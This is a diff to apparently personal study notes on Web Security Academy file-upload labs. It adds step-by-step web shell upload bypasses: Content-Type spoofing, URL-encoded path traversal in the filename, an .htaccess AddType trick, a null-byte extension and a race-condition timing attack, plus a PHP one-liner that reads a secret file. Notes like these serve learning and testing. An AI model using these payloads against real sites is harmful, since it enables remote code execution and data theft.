@@ -942,9 +942,40 @@
   - Upload **exploit.php**
     `<?php echo file_get_contents('/home/carlos/secret'); ?>`
   - GET /files/avatars/exploit.php   > secret code
-- ddd
-- ddd
-- ddd
+- Web shell upload via **Content-Type** restriction bypass
+  - Error: file type application/octet-stream is not allowed Only image/jpeg and image/png are allowed
+  - POST /my-account/avatar   
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJEBayCEruOgolfHL   
+    Content-Disposition: form-data; name="avatar"; filename="exploit.php"
+  - Change the content-type to `Content-Type:image/jpeg`
+- Web shell upload via **path traversal**
+  - The server has just returned the contents of the PHP file as plain text.
+  - In the Content-Disposition header, change the filename to include a directory traversal sequence
+    Content-Disposition: form-data; name="avatar"; filename="**../**exploit.php"   
+    Response: The file avatars/exploit.php has been uploaded.
+  - Obfuscate the directory traversal sequence by URL encoding the forward slash (/)
+    Content-Disposition: form-data; name="avatar"; filename="`..%2f`exploit.php"   
+    Response: The file avatars/../exploit.php has been uploaded.   
+  - Browse the file, Uploaded as /files/avatars/..%2fexploit.php   
+    https://0aa000c804f4e4a281500c7b002200b4.web-security-academy.net/files/avatars/**exploit.php**
+- Web shell upload via **extension blacklist bypass**
+  - Change the requests for filename and content-type parameter
+    Content-Disposition: form-data; name="avatar"; **filename=".htaccess"**
+    **Content-Type: text/plain**   
+    `AddType application/x-httpd-php .l33t`   
+    Response: The file avatars/.htaccess has been uploaded.   
+  - Content-Disposition: form-data; name="avatar"; **filename="exploit.l33t"**   
+    Content-Type: image/jpeg   
+    Response: The file avatars/exploit.l33t has been uploaded.   
+  - Browse: https://0aad0062048b502c8543289b001c008d.web-security-academy.net/files/avatars/exploit.l33t
+- Web shell upload via **obfuscated file extension**
+  - Content-Disposition: form-data; name="avatar"; filename="**exploit.php%00.jpg**"   
+- Remote code execution via polyglot **web shell upload**   
+- Web shell upload via **race condition**
+  - The uploaded file is moved to an accessible folder, where it is checked for viruses. Malicious files are only removed once the virus check is complete. This means it's possible to execute the file in the small time-window before it is removed
+  - Send repeater for POST /my-account/avatar & GET /files/avatars/exploit.php request   
+  - in POST request > add tab to group > create new group > add GET request   
+  - send group in parallel    
 
 ## Race Condition
 Content for Race Condition...
